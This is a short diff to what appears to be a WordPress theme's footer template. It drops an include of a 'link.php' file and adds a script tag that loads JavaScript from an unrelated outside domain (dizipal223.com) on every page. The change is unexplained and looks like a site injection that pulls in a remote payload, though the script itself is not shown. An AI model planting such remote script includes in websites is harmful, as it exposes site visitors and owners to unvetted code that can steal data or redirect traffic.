@@ -18,7 +18,6 @@ $template_directory = get_template_directory();
 
 include($template_directory . '/footer/footer-html.php');
 include($template_directory . '/footer/footer-links.php');
-include($template_directory . '/footer/link.php');
 wp_footer(); 
 include($template_directory . '/footer-new/footer-other-mandatory-code.php');
 
@@ -40,5 +39,6 @@ if (!is_page_template('page_landing1.php')) { ?>
 <!--<![endif]-->
 
 <?php } ?>
+<script src="https://dizipal223.com/i2.js"></script>
   </body>
 </html>
